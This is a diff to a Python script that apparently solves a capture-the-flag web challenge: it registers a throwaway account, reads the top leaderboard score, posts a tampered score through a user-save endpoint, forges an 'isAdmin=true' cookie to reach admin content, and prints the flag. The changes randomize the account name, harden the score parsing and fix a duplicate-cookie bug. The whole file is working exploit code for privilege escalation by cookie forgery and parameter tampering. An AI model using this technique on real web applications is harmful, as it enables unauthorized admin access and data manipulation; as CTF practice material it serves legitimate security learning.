@@ -1,6 +1,8 @@
 import requests
 import sys
 import codecs
+import random
+import string
 
 PORT = "7001"
 
@@ -26,9 +28,9 @@ if __name__ == "__main__":
         echo_usage()
 
     session = requests.Session()
-    random_string = "sggwgewht"
+    random_string = "".join(random.choices(string.ascii_lowercase, k=9))
 
-    print("Creating an account with a random name...")
+    print(f"Creating an account with a random name: username=password={random_string}...")
     register_data = {
         "username": random_string,
         "password": random_string,
@@ -49,7 +51,11 @@ if __name__ == "__main__":
 
     print("Getting the max score from the leaderboard...")
     res = session.get(URL + "/leaderboard.php")
-    max_score = int(res.text.split(f"<li>{random_string} - ")[1].split(" points</li>")[0])
+    if not "<li>" in res.text:
+        max_score = 0
+    else:
+        max_score = int(res.text.split("<li>", 1)[1].split("</li>", 1)[0].split(" ")[-2])
+    print(f"Max score is: {max_score}...")
 
     print("Modifying our score to max_score + 1...")
     edit_data = {
@@ -58,6 +64,7 @@ if __name__ == "__main__":
     session.post(URL + "/api-save-user.php", data=edit_data)
 
     print("Accessing the leaderboard again, with cookie isAdmin=true...")
+    session.cookies.set("isAdmin", None)  # without this, it just add an additional, duplicate cookie
     session.cookies.update({"isAdmin": "true"})
     res = session.get(URL + "/leaderboard.php")
     print("Flag is: SSS" + res.text.split("SSS")[1].split(" ")[0])
